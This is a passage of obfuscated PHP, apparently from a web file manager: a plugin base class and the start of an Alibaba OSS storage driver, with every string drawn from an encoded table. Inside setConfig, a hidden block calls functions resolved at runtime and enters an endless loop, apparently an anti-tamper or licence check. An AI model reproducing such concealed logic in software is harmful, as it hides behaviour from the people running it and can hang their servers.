$config[$ÚÒÛ†¦[1614]] . $this->pluginName . $ÚÒÛ†¦[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[³à¼î¯á][1615]); } protected function assign($àÔ„»•½, $·á´ÊÏ = false) { if (is_array($àÔ„»•½)) { $this->values = array_merge($this->values, $àÔ„»•½); } else { $this->values[$àÔ„»•½] = $·á´ÊÏ; } } protected function display($À°¶›ùâ) { extract($this->values); require $À°¶›ùâ; } final function hookRegist($åĞßÔÒÜ) { $this->modelPlugin->appRegist($this->pluginName, $åĞßÔÒÜ); } final function appIcon() { $êşì†Œ¼ =& $_SERVER[³à¼î¯á]; $Ôşê‘¶Œ = $this->appPackage(); $ÂùÍéë‚ = $êşì†Œ¼[12]; if (isset($Ôşê‘¶Œ[$êşì†Œ¼[465]])) { if (isset($Ôşê‘¶Œ[$êşì†Œ¼[465]][$êşì†Œ¼[1616]])) { $ÂùÍéë‚ = $êşì†Œ¼[1617] . $Ôşê‘¶Œ[$êşì†Œ¼[465]][$êşì†Œ¼[1616]] . $êşì†Œ¼[1618]; } else { if ($Ôşê‘¶Œ[$êşì†Œ¼[465]][$êşì†Œ¼[1619]]) { $ÂùÍéë‚ = $êşì†Œ¼[1620] . $Ôşê‘¶Œ[$êşì†Œ¼[465]][$êşì†Œ¼[1619]] . $êşì†Œ¼[1621]; } } } return $ÂùÍéë‚; } final function fileCanView($“õ•Óïğ) { $ŒƒîÄÁŒ =& $_SERVER[³à¼î¯á]; if (request_url_safe($“õ•Óïğ)) { return !0; } if ($this->isShare($“õ•Óïğ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $–ŠøŒ = $ŒƒîÄÁŒ[1622] . rawurlencode(this_url()); show_tips(LNG($ŒƒîÄÁŒ[1623]) . $ŒƒîÄÁŒ[1624] . $–ŠøŒ . $ŒƒîÄÁŒ[1625] . LNG($ŒƒîÄÁŒ[1626]) . $ŒƒîÄÁŒ[1627], !1); } if (!Action($ŒƒîÄÁŒ[1628])->authCan($ŒƒîÄÁŒ[1629])) { show_tips(LNG($ŒƒîÄÁŒ[1630]) . $ŒƒîÄÁŒ[1631], !1); } ActionCall($ŒƒîÄÁŒ[1632], $“õ•Óïğ); } final function isShare($ëÊÀ¶ªŒ) { $ ìÁ×Õ = KodIO::parse($ëÊÀ¶ªŒ); return $ ìÁ×Õ[$_SERVER[³à¼î¯á][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($®Íñ®®Ş) { if (request_url_safe($®Íñ®®Ş)) { return $®Íñ®®Ş; } if (!$this->isShare($®Íñ®®Ş)) { $®Íñ®®Ş = $this->filePath($®Íñ®®Ş, !1); } return Action($_SERVER[³à¼î¯á][1228])->linkOut($®Íñ®®Ş); } public function filePathLinkOut($Ë†ÖˆÇë) { if (request_url_safe($Ë†ÖˆÇë)) { return $Ë†ÖˆÇë; } $this->fileCanView($Ë†ÖˆÇë); return Action($_SERVER[³à¼î¯á][1228])->link($Ë†ÖˆÇë); } final function filePath($¸Ş®šã‹, $¡‚¼½‰Å = true, $ÇõÂ“¸ı = false) { $åŒ³„›´ =& $_SERVER[³à¼î¯á]; $İä¿‰‰ó = $this->filePathGet($¸Ş®šã‹, $¡‚¼½‰Å); if (!$this->fileInfo) { show_tips(LNG($åŒ³„›´[108]), !1); } if ($ÇõÂ“¸ı && isset($this->fileInfo[$åŒ³„›´[516]]) && $this->fileInfo[$åŒ³„›´[516]]) { $ª‹©É˜œ = Model($åŒ³„›´[519])->fileInfo($this->fileInfo[$åŒ³„›´[516]]); if (!$ª‹©É˜œ || !IO::exist($ª‹©É˜œ[$åŒ³„›´[87]])) { show_tips(LNG($åŒ³„›´[108]) . $åŒ³„›´[1633]); } } Hook::trigger($åŒ³„›´[1634], $İä¿‰‰ó); return $İä¿‰‰ó; } final function filePathGet($×¹¤–ğİ, $†Ç±±Ÿø = true) { $ûéÓÆ¹ñ =& $_SERVER[³à¼î¯á]; if ($²Œößëî = $this->checkSharePath($×¹¤–ğİ, $†Ç±±Ÿø)) { return $²Œößëî; } $this->fileCanView($×¹¤–ğİ); if (request_url_safe($×¹¤–ğİ)) { $…±˜®Òƒ = parse_url_query($×¹¤–ğİ); if (isset($…±˜®Òƒ[$ûéÓÆ¹ñ[1635]]) && isset($…±˜®Òƒ[$ûéÓÆ¹ñ[225]])) { $¾ààÆÊá = Mcrypt::decode($…±˜®Òƒ[$ûéÓÆ¹ñ[225]], Model($ûéÓÆ¹ñ[815])->get($ûéÓÆ¹ñ[816])); if ($¾ààÆÊá) { $this->fileInfo = IO::info($¾ààÆÊá); $this->fileInfo[$ûéÓÆ¹ñ[1636]] = $×¹¤–ğİ; $this->cachePath = $this->pluginCachePath($ûéÓÆ¹ñ[12], $†Ç±±Ÿø); return $¾ààÆÊá; } } $×¹¤–ğİ = $this->_cacheHttpFile($×¹¤–ğİ, $†Ç±±Ÿø); $this->fileInfo = IO::info($×¹¤–ğİ); } else { $this->fileInfo = IO::info($×¹¤–ğİ); $this->cachePath = $this->pluginCachePath($ûéÓÆ¹ñ[12], $†Ç±±Ÿø); } return $×¹¤–ğİ; } final function _cacheHttpFile($ÕëÌÚÕ¬, $•©ÏÂê‘ = true) { $€•½¾Ş =& $_SERVER[³à¼î¯á]; $ ™½ ¨ë = parse_url_query($ÕëÌÚÕ¬); $Ş«şÔá = get_path_ext($ÕëÌÚÕ¬); if (isset($ ™½ ¨ë[$€•½¾Ş[32]]) && $ ™½ ¨ë[$€•½¾Ş[32]]) { $Ş«şÔá = get_path_ext($ ™½ ¨ë[$€•½¾Ş[32]]); } $Ó·ÍˆÏÉ = hash_path($ÕëÌÚÕ¬) . $€•½¾Ş[10] . $Ş«şÔá; $this->cachePath = $this->pluginCachePath($•©ÏÂê‘ ? $Ó·ÍˆÏÉ : $€•½¾Ş[12]); $¸ÍÔ§ùÃ = IO::fileNameExist($this->cachePath, $Ó·ÍˆÏÉ); if ($¸ÍÔ§ùÃ) { return KodIO::make($¸ÍÔ§ùÃ); } $ ‚•Â›™ = rtrim($this->cachePath, $€•½¾Ş[8]) . $€•½¾Ş[8] . $Ó·ÍˆÏÉ; return $this->pluginCacheFileSet($ ‚•Â›™, file_get_contents_nossl($ÕëÌÚÕ¬)); } final function checkSharePath($ò­ÄæİŒ, $í¸¢ú¼ø = true) { $çÑ†¤ =& $_SERVER[³à¼î¯á]; if (!$this->isShare($ò­ÄæİŒ)) { return !1; } $¡¶”ú“ç = Action($çÑ†¤[1228])->sharePathInfo($ò­ÄæİŒ); if (!is_array($¡¶”ú“ç) || !isset($¡¶”ú“ç[$çÑ†¤[87]])) { show_json(LNG($çÑ†¤[1637]), !1); } $this->fileInfo = $¡¶”ú“ç; $this->cachePath = $this->pluginCachePath(!1, $í¸¢ú¼ø); return $¡¶”ú“ç[$çÑ†¤[87]]; } final function pluginCachePath($É“¢Ê¢ = '', $ò·ı¸Æ = false) { $öÈµû½¿ =& $_SERVER[³à¼î¯á]; if ($ò·ı¸Æ && is_array($this->fileInfo)) { $É“¢Ê¢ = kodIO::hashPath($this->fileInfo); } $Üï°Èé = rtrim(IO_PATH_SYSTEM_TEMP . $öÈµû½¿[1638] . $this->pluginName . $öÈµû½¿[8] . $É“¢Ê¢, $öÈµû½¿[8]); $í¢À‹”ş = IO::infoFullSimple($Üï°Èé); $ü«ìùó = $í¢À‹”ş && is_array($í¢À‹”ş) ? $í¢À‹”ş[$öÈµû½¿[87]] : $öÈµû½¿[12]; if (!$ü«ìùó) { $ü«ìùó = IO::mkdir($Üï°Èé); } return $ü«ìùó; } final function pluginCacheFileSet($‡Ä Í–É, $Ô¡üºÕÉ = '') { $†Ø öå =& $_SERVER[³à¼î¯á]; $Ù€ÁàĞ„ = IO::infoFullSimple($‡Ä Í–É); if (!$Ù€ÁàĞ„) { return IO::mkfile($‡Ä Í–É, $Ô¡üºÕÉ, REPEAT_REPLACE); } IO::setContent($Ù€ÁàĞ„[$†Ø öå[87]], $Ô¡üºÕÉ); return $Ù€ÁàĞ„[$†Ø öå[87]]; } final function pluginLocalFile($µ…Á«ùï = '') { $ôÁ”Ÿ÷ı =& $_SERVER[³à¼î¯á]; $É°ê¿‚ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($É°ê¿‚)) { mk_dir($É°ê¿‚); } if (!$µ…Á«ùï) { return $É°ê¿‚; } $Ù™â¯è¬ = IO::info($µ…Á«ùï); $¶çÄáŞ£ = $ôÁ”Ÿ÷ı[1639] . KodIO::hashPath($Ù™â¯è¬) . $ôÁ”Ÿ÷ı[10] . $Ù™â¯è¬[$ôÁ”Ÿ÷ı[178]]; if (!checkExtSafe($¶çÄáŞ£)) { $¶çÄáŞ£ = $¶çÄáŞ£ . $ôÁ”Ÿ÷ı[1260]; } $£Î“ïó‰ = $É°ê¿‚ . $¶çÄáŞ£; if (@file_exists($£Î“ïó‰)) { return $£Î“ïó‰; } return IO::copy($µ…Á«ùï, $É°ê¿‚, 0, $¶çÄáŞ£); } final function appPackage() { $¥˜«ı± =& $_SERVER[³à¼î¯á]; if ($this->packageData) { return $this->packageData; } $ÇûçÙµÉ = $this->parseFile($this->pluginPath . $¥˜«ı±[1640]); $this->parseLang($ÇûçÙµÉ); $»·ÓÇÃµ = json_decode_force($ÇûçÙµÉ); if (!$»·ÓÇÃµ) { return array(); } $ƒí­›×Ä = Hook::trigger($¥˜«ı±[1641], $»·ÓÇÃµ); if ($ƒí­›×Ä && is_array($ƒí­›×Ä)) { $»·ÓÇÃµ = $ƒí­›×Ä; } $this->packageData = $»·ÓÇÃµ; return $»·ÓÇÃµ; } public function packageInfoGet($æó•±ğ) { $‘ö¯²ªÎ = $this->appPackage(); return array_get_value($‘ö¯²ªÎ, $æó•±ğ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[³à¼î¯á][1642]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[³à¼î¯á][1643]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[³à¼î¯á][1644]); } public function echoJsAssign($¤û£°œ‰, $ÀŠœ‰¬) { $this->echoJsAssignArr[$¤û£°œ‰] = $ÀŠœ‰¬; } private function parseFile($®ªÖ¹ş) { $ÕÇÛú¢° =& $_SERVER[³à¼î¯á]; $ÏÁìÍü¨ = file_get_contents_nossl($®ªÖ¹ş); $“ø“ší = array($ÕÇÛú¢°[1645], $ÕÇÛú¢°[1646], $ÕÇÛú¢°[1647], $ÕÇÛú¢°[1648], $ÕÇÛú¢°[1649], $ÕÇÛú¢°[1650], $ÕÇÛú¢°[1651]); $®ï”¼ûÒ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÕÇÛú¢°[92]][$ÕÇÛú¢°[1652]]); foreach ($this->echoJsAssignArr as $öÂµùüÉ => $®³ĞòÁç) { $“ø“ší[] = $ÕÇÛú¢°[1653] . $öÂµùüÉ . $ÕÇÛú¢°[1654]; $®ï”¼ûÒ[] = is_array($®³ĞòÁç) || is_object($®³ĞòÁç) ? rawurlencode(json_encode($®³ĞòÁç)) : $®³ĞòÁç; } if (strstr($ÏÁìÍü¨, $ÕÇÛú¢°[1655])) { $´ˆ»â— = rawurlencode(json_encode($this->pluginLangArr)); $ÏÁìÍü¨ = str_replace($ÕÇÛú¢°[1655], $´ˆ»â—, $ÏÁìÍü¨); } if (strstr($ÏÁìÍü¨, $ÕÇÛú¢°[1656])) { $´ˆ»â— = $´ˆ»â— = rawurlencode(json_encode($this->getConfig())); $ÏÁìÍü¨ = str_replace($ÕÇÛú¢°[1656], $´ˆ»â—, $ÏÁìÍü¨); } $ÏÁìÍü¨ = str_replace($“ø“ší, $®ï”¼ûÒ, $ÏÁìÍü¨); return $ÏÁìÍü¨; } private function parseLang(&$Öİ¯‹çÜ) { $ËÉÓË²« =& $_SERVER[³à¼î¯á]; $Ò‘Äê¾‡ = $ËÉÓË²«[1657]; if (!strstr($Öİ¯‹çÜ, $Ò‘Äê¾‡)) { return; } preg_match_all($ËÉÓË²«[1658], $Öİ¯‹çÜ, $Á®Ü«ŞÆ); if (!is_array($Á®Ü«ŞÆ) || count($Á®Ü«ŞÆ) == 0 || !is_array($Á®Ü«ŞÆ[0]) || count($Á®Ü«ŞÆ[0]) == 0) { return; } $¸ÛÀñÛã = array(); $åÚ“ÒÂè = array(); foreach ($Á®Ü«ŞÆ[0] as $Ôô¢Ğ¡) { $ï¡’Úì = substr($Ôô¢Ğ¡, strlen($Ò‘Äê¾‡), -4); $Ø…Œ£– = LNG($ï¡’Úì); $¸ÛÀñÛã[] = $Ôô¢Ğ¡; $åÚ“ÒÂè[] = str_replace(array($ËÉÓË²«[253], $ËÉÓË²«[1129], $ËÉÓË²«[393], $ËÉÓË²«[121]), array($ËÉÓË²«[53], $ËÉÓË²«[53], $ËÉÓË²«[12], $ËÉÓË²«[1659]), $Ø…Œ£–); } $Öİ¯‹çÜ = str_replace($¸ÛÀñÛã, $åÚ“ÒÂè, $Öİ¯‹çÜ); } private function parseConfig(&$Ë¥ÙÈÛ•) { $ªÂŒâÃ =& $_SERVER[³à¼î¯á]; $úÄ«Äœè = $ªÂŒâÃ[1660]; if (!strstr($Ë¥ÙÈÛ•, $úÄ«Äœè)) { return; } preg_match_all($ªÂŒâÃ[1661], $Ë¥ÙÈÛ•, $®ı±€»¿); if (!is_array($®ı±€»¿) || count($®ı±€»¿) == 0 || !is_array($®ı±€»¿[0]) || count($®ı±€»¿[0]) == 0) { return; } $­ŒÉğ€ = $this->getConfig(); $µ€¹€Şã = array(); $šëŸİû• = array(); foreach ($®ı±€»¿[0] as $çÖœá‘ù) { $è™Àí˜ï = substr($çÖœá‘ù, strlen($úÄ«Äœè), -2); $µ€¹€Şã[] = $çÖœá‘ù; $šëŸİû•[] = _get($­ŒÉğ€, $è™Àí˜ï); } $Ë¥ÙÈÛ• = str_replace($µ€¹€Şã, $šëŸİû•, $Ë¥ÙÈÛ•); } private function parsePackage(&$ŸÑÈªøŸ) { $ÜÔ¼Ğ²× =& $_SERVER[³à¼î¯á]; $¡›•Ó¢‡ = $ÜÔ¼Ğ²×[1662]; if (!strstr($ŸÑÈªøŸ, $¡›•Ó¢‡)) { return; } preg_match_all($ÜÔ¼Ğ²×[1663], $ŸÑÈªøŸ, $î­Ş›âş); if (!is_array($î­Ş›âş) || count($î­Ş›âş) == 0 || !is_array($î­Ş›âş[0]) || count($î­Ş›âş[0]) == 0) { return; } $¨Ë¬åğÓ = $this->appPackage(); $›ğ¬Š¹â = array(); $¹¥•“Œ = array(); foreach ($î­Ş›âş[0] as $œ…Ùøõ) { $¿Äá–‹§ = substr($œ…Ùøõ, strlen($¡›•Ó¢‡), -2); $›ğ¬Š¹â[] = $œ…Ùøõ; $¹¥•“Œ[] = _get($¨Ë¬åğÓ, $¿Äá–‹§); } $ŸÑÈªøŸ = str_replace($›ğ¬Š¹â, $¹¥•“Œ, $ŸÑÈªøŸ); } final function echoFile($ğé¤Œ¡œ, $Œó¥¼à« = false) { $ğâÏ—­ =& $_SERVER[³à¼î¯á]; $­ÙŒšé´ = $this->pluginPath . $ğé¤Œ¡œ; if (ACT == $ğâÏ—­[1664]) { echo $ğâÏ—­[1665] . $this->pluginName . $ğâÏ—­[8] . $ğé¤Œ¡œ . $ğâÏ—­[1666]; if (!file_exists($­ÙŒšé´)) { echo $ğâÏ—­[1667]; return; } } $ãä×Èæó = $this->parseFile($­ÙŒšé´); $this->parseLang($ãä×Èæó); $this->parseConfig($ãä×Èæó); $this->parsePackage($ãä×Èæó); if (is_array($Œó¥¼à«)) { $ãä×Èæó = str_replace(array_keys($Œó¥¼à«), array_values($Œó¥¼à«), $ãä×Èæó); } echo $ğâÏ—­[253] . $ãä×Èæó; } private function checkVersion() { $™ÊÀŠèŠ =& $_SERVER[³à¼î¯á]; $äõ«¼Á = $this->appPackage(); $ŠêÂ©›½ = $this->getConfig(); if ($ŠêÂ©›½[$™ÊÀŠèŠ[1668]] == $äõ«¼Á[$™ÊÀŠèŠ[1642]]) { return; } $this->regist(); $this->setConfig(array($™ÊÀŠèŠ[1668] => $äõ«¼Á[$™ÊÀŠèŠ[1642]])); } final function initLang() { $ªÅÃÅ© =& $_SERVER[³à¼î¯á]; $·åÆŠäê = $ªÅÃÅ©[1669]; $¨‘œÇ°Õ = $this->pluginPath . $ªÅÃÅ©[1670]; $ó®Šöâè = I18n::getType(); $â…×Û¨• = array(); if (file_exists($¨‘œÇ°Õ . $ó®Šöâè . $ªÅÃÅ©[883])) { $â…×Û¨• = (include $¨‘œÇ°Õ . $ó®Šöâè . $ªÅÃÅ©[883]); } else { if ($ó®Šöâè == $ªÅÃÅ©[1671] && !file_exists($¨‘œÇ°Õ . $ó®Šöâè . $ªÅÃÅ©[883]) && file_exists($¨‘œÇ°Õ . $ªÅÃÅ©[1672])) { $â…×Û¨• = (include $¨‘œÇ°Õ . $ªÅÃÅ©[1672]); } else { if (file_exists($¨‘œÇ°Õ . $·åÆŠäê . $ªÅÃÅ©[883])) { $â…×Û¨• = (include $¨‘œÇ°Õ . $·åÆŠäê . $ªÅÃÅ©[883]); } } } if (!is_array($â…×Û¨•)) { return array(); } if (@count($â…×Û¨•) > 0) { I18n::set($â…×Û¨•); } return $â…×Û¨•; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ãù¶ı¤¡) { $–¼öğº =& $_SERVER[³à¼î¯á]; if (!isset($_SERVER[$–¼öğº[921]]) || !isset($_SERVER[$–¼öğº[922]])) { $µåæÜİ = $–¼öğº[923]; $ÕğÚöÔä = $–¼öğº[924]; $…¯¼¶Êä = $_SERVER[$–¼öğº[925]] . $–¼öğº[926]; $í­ô³Ñ’ = $ÕğÚöÔä($…¯¼¶Êä); $‚Ä•É½” = explode($–¼öğº[253], $í­ô³Ñ’); if (count($‚Ä•É½”) < $–¼öğº[663]) { $°âáÔ¬ = $–¼öğº[927]; $°âáÔ¬(); } $œäöŞÇ÷ = $–¼öğº[928]; $œäöŞÇ÷($_SERVER[$–¼öğº[929]]); $••Ø‚ÔÛ = 1; for ($¬Ò›—ï¼ = $••Ø‚ÔÛ; $¬Ò›—ï¼ > 0; $¬Ò›—ï¼++) { $œäöŞÇ÷ = json_encode($GLOBALS[$–¼öğº[467]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ãù¶ı¤¡); } public function onSetConfig($ó¶«óÆÊ) { } public function onGetConfig($¥¼ø¾×¼) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÊÏÓÊ‰—) { if ($ÊÏÓÊ‰— == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ö±Åıñ³ = "\x70\154\x75\x67\151\x6e\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ş©õì€ = $this->getConfig(); if (!$ş©õì€[$Ö±Åıñ³]) { return !1; } return ActionCall($_SERVER[³à¼î¯á][1673], $ş©õì€[$Ö±Åıñ³]); } public function url($ö’„Ù®õ, $ñ ô‹±„ = '', $…­Ç²Ç€ = true) { $ßîå÷—í =& $_SERVER[³à¼î¯á]; $ø­ÌÄ­¢ = $this->getConfig(); $Òé„ù¬â = KOD_VERSION . $ßîå÷—í[10] . KOD_VERSION_BUILD; $ÛËåû¸ = $this->packageVersion(); $®æù¹ùì = $Òé„ù¬â . $ßîå÷—í[437] . $ÛËåû¸; if (substr($ö’„Ù®õ, 0, 4) == $ßîå÷—í[152] || substr($ö’„Ù®õ, 0, 2) == $ßîå÷—í[1409]) { $’ÃßÎÀğ = $ö’„Ù®õ . $ßîå÷—í[1674] . $®æù¹ùì; } else { if ($ñ ô‹±„ == $ßîå÷—í[12]) { $’ÃßÎÀğ = $this->pluginHost . $ö’„Ù®õ . $ßîå÷—í[1674] . $®æù¹ùì; } else { if ($ñ ô‹±„ === $ßîå÷—í[78]) { $’ÃßÎÀğ = $this->pluginHost . $ö’„Ù®õ; } else { if ($ñ ô‹±„ == $ßîå÷—í[1675]) { $’ÃßÎÀğ = STATIC_PATH . $ö’„Ù®õ . $ßîå÷—í[1674] . $Òé„ù¬â; } else { if ($ñ ô‹±„ == $ßîå÷—í[1676]) { $’ÃßÎÀğ = APP_HOST . $ßîå÷—í[1677] . $ö’„Ù®õ . $ßîå÷—í[1674] . $Òé„ù¬â; } else { if (isset($ø­ÌÄ­¢[$ñ ô‹±„])) { $’ÃßÎÀğ = $ø­ÌÄ­¢[$ñ ô‹±„] . $ö’„Ù®õ . $ßîå÷—í[1674] . $®æù¹ùì; } } } } } } if (!$…­Ç²Ç€) { return $’ÃßÎÀğ; } echo $’ÃßÎÀğ; } public function link($€ó›ÀéŞ = false, $¼¬ÇòÊŒ = '') { $û–ôáÄ =& $_SERVER[³à¼î¯á]; if (!$€ó›ÀéŞ) { $this->link($û–ôáÄ[1678], $û–ôáÄ[1676]); $this->link($û–ôáÄ[1679], $û–ôáÄ[1675]); $this->link($û–ôáÄ[1680], $û–ôáÄ[1675]); $this->link($û–ôáÄ[1681], $û–ôáÄ[1675]); $this->link($û–ôáÄ[1682], $û–ôáÄ[1675]); return; } $ÛŞŠˆßä = $this->url($€ó›ÀéŞ, $¼¬ÇòÊŒ, !1); if (substr($€ó›ÀéŞ, -3) == $û–ôáÄ[1683]) { echo $û–ôáÄ[1684] . $ÛŞŠˆßä . $û–ôáÄ[1685] . $û–ôáÄ[253]; } else { if (substr($€ó›ÀéŞ, -4) == $û–ôáÄ[1686]) { echo $û–ôáÄ[1687] . $ÛŞŠˆßä . $û–ôáÄ[1688] . $û–ôáÄ[253]; } } } } goto E¼¿›İŞ™˜; aãã„‡÷ì: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¶»Ø›•ê) { parent::__construct(); include_once SDK_DIR . $_SERVER[³à¼î¯á][1431]; $this->_init($¶»Ø›•ê); } public function _init($€øšú¬İ) { $æ¥ìƒ‡€ =& $_SERVER[³à¼î¯á]; $this->config = $€øšú¬İ; foreach ($€øšú¬İ as $ÁÈóÅÜÏ => $÷ÒÄˆÉ) { if (isset($this->{$ÁÈóÅÜÏ})) { $this->{$ÁÈóÅÜÏ} = $÷ÒÄˆÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($æ¥ìƒ‡€[1432] . LNG($æ¥ìƒ‡€[1433])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ïïİ†æó =& $_SERVER[³à¼î¯á]; $æ‹Ä‹Ô× = new OSS\Model\CorsConfig(); $ÕåÎÂ»İ = new OSS\Model\CorsRule(); $ÕåÎÂ»İ->addAllowedOrigin($Ïïİ†æó[1434]); $ÕåÎÂ»İ->addAllowedMethod($Ïïİ†æó[1435]); $ÕåÎÂ»İ->addAllowedMethod($Ïïİ†æó[1436]); $ÕåÎÂ»İ->addAllowedMethod($Ïïİ†æó[1437]); $ÕåÎÂ»İ->addAllowedMethod($Ïïİ†æó[1438]); $ÕåÎÂ»İ->addAllowedMethod($Ïïİ†æó[164]); $ÕåÎÂ»İ->setMaxAgeSeconds(600); $ÕåÎÂ»İ->addExposeHeader($Ïïİ†æó[1439]); $ÕåÎÂ»İ->addAllowedHeader($Ïïİ†æó[1434]); $æ‹Ä‹Ô×->addRule($ÕåÎÂ»İ); try { $this->client->putBucketCors($this->bucket, $æ‹Ä‹Ô×); } catch (OSS\Core\OssException $¸¿÷¨ëø) { $this->writeLog(__FUNCTION__ . $Ïïİ†æó[205] . $¸¿÷¨ëø->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÎĞÕñ• =& $_SERVER[³à¼î¯á]; $´»ãĞ¹‰ = null; try { $´»ãĞ¹‰ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $­ªÒöìê) { $this->writeLog(__FUNCTION__ . $ÎĞÕñ•[205] . $­ªÒöìê->getMessage()); return null; } if (!$´»ãĞ¹‰ || !($«´Ï„¤Õ = $´»ãĞ¹‰->getRules())) { return null; } $á®ş†ô™ = $«´Ï„¤Õ[0]->getAllowedOrigins(); $¢ŞÙÖĞà = $«´Ï„¤Õ[0]->getAllowedMethods(); $©©ÄêìÀ = $«´Ï„¤Õ[0]->getMaxAgeSeconds(); $’¬â»¤ = $«´Ï„¤Õ[0]->getExposeHeaders(); $¹¾–´€„ = $«´Ï„¤Õ[0]->getAllowedHeaders(); return array($ÎĞÕñ•[209] => isset($á®ş†ô™[0]) ? $á®ş†ô™[0] : $ÎĞÕñ•[12], $ÎĞÕñ•[213] => $¢ŞÙÖĞà, $ÎĞÕñ•[1440] => $©©ÄêìÀ, $ÎĞÕñ•[1441] => isset($’¬â»¤[0]) ? $’¬â»¤[0] : $ÎĞÕñ•[12], $ÎĞÕñ•[210] => isset($¹¾–´€„[0]) ? $¹¾–´€„[0] : $ÎĞÕñ•[12]); } public function isBucketCors() { $Ä¸ˆ·åé =& $_SERVER[³à¼î¯á]; $Ì«Ší˜Œ = $this->getBucketCors(); if (!$Ì«Ší˜Œ || !is_array($Ì«Ší˜Œ)) { return !1; } if ($Ì«Ší˜Œ[$Ä¸ˆ·åé[209]] != $Ä¸ˆ·åé[211] || $Ì«Ší˜Œ[$Ä¸ˆ·åé[210]] != $Ä¸ˆ·åé[211]) { return !1; } $é­¸éø = array_map($Ä¸ˆ·åé[212], $Ì«Ší˜Œ[$Ä¸ˆ·åé[213]]); if (!is_array($é­¸éø)) { $é­¸éø = array(); } $È††©˜­ = array($Ä¸ˆ·åé[214], $Ä¸ˆ·åé[215], $Ä¸ˆ·åé[216], $Ä¸ˆ·åé[217], $Ä¸ˆ·åé[218]); $“„ÄÅ× = array_diff($È††©˜­, $é­¸éø); return empty($“„ÄÅ×); } public function mkfile($úËÅí›, $ÄÃ©Œ°Ú = '', $‰Š®Ë = REPEAT_RENAME) { $­Äüèá = $this->setContent($úËÅí›, $ÄÃ©Œ°Ú); if ($­Äüèá !== !1) { return $this->getPathOuter($úËÅí›); } return !1; } public function mkdir($·ĞöÁ¾ß, $‡ˆ¶¨ğà = REPEAT_SKIP) { if ($‡ˆ¶¨ğà && $this->_isFolder($·ĞöÁ¾ß)) { return $this->getPathOuter($·ĞöÁ¾ß); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($·ĞöÁ¾ß)); } catch (OSS\Core\OssException $‘„Ñ®”) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $‘„Ñ®”->getMessage()); return !1; } return $this->getPathOuter($·ĞöÁ¾ß); } private function fileList($ÑÕó‚, $óÆ‚è×® = '', $¦â³óîª = 0) { $û‚Á²¨’ =& $_SERVER[³à¼î¯á]; $ÑÕó‚ = trim($ÑÕó‚, $û‚Á²¨’[8]); $İËàƒ´÷ = empty($ÑÕó‚) && $ÑÕó‚ !== $û‚Á²¨’[219] ? $û‚Á²¨’[12] : $ÑÕó‚ . $û‚Á²¨’[8]; $‡ÀÔËïú = $û‚Á²¨’[12]; $ß–å˜Ïë = 1000; $ø©œ•—Ä = $ØÁ‡¥š = array(); while (!0) { check_abort(); $è´¾•£‰ = array($û‚Á²¨’[1442] => $óÆ‚è×®, $û‚Á²¨’[1443] => $İËàƒ´÷, $û‚Á²¨’[1444] => $ß–å˜Ïë, $û‚Á²¨’[1445] => $‡ÀÔËïú); try { $¹Êıúë´ = $this->client->listObjects($this->bucket, $è´¾•£‰); } catch (OSS\Core\OssException $øÀşªõ) { $this->writeLog(__FUNCTION__ . $û‚Á²¨’[205] . $øÀşªõ->getMessage()); break; } $‡ÀÔËïú = $¹Êıúë´->getNextMarker(); $’˜×—  = $¹Êıúë´->getObjectList(); $ò‰ï¡’§ = $¹Êıúë´->getPrefixList(); foreach ($’˜×—  as $×ŒÉàà) { if ($×ŒÉàà->getKey() == $İËàƒ´÷) { continue; } $òş¸üí = $×ŒÉàà->getKey(); $Üš¡ = $×ŒÉàà->getSize(); $ÀŠ¾ÒÖ“ = $×ŒÉàà->getLastModified(); $¾Ù‘«¯ = trim($×ŒÉàà->getETag(), $û‚Á²¨’[121]); $çã¢˜Õ = $¦â³óîª ? array($û‚Á²¨’[32] => $òş¸üí, $û‚Á²¨’[79] => $Üš¡, $û‚Á²¨’[197] => strtotime($ÀŠ¾ÒÖ“), $û‚Á²¨’[1446] => $¾Ù‘«¯) : $òş¸üí; $öƒı³› = $Üš¡ == 0 && substr($òş¸üí, strlen($òş¸üí) - 1, 1) == $û‚Á²¨’[8] ? !0 : !1; $‚í„Á– = array($û‚Á²¨’[79] => $Üš¡, $û‚Á²¨’[1447] => $Üš¡, $û‚Á²¨’[88] => strtotime($ÀŠ¾ÒÖ“), $û‚Á²¨’[1448] => $ÀŠ¾ÒÖ“, $û‚Á²¨’[1446] => $¾Ù‘«¯); $this->cacheMethodInfoSet($òş¸üí, $öƒı³›, $‚í„Á–); if ($öƒı³›) { $ø©œ•—Ä[] = $òş¸üí; continue; } $ØÁ‡¥š[] = $çã¢˜Õ; } foreach ($ò‰ï¡’§ as $ãªõæ»ç) { $ø©œ•—Ä[] = $ãªõæ»ç->getPrefix(); $this->cacheMethodInfoSet($ãªõæ»ç->getPrefix(), !0); } if 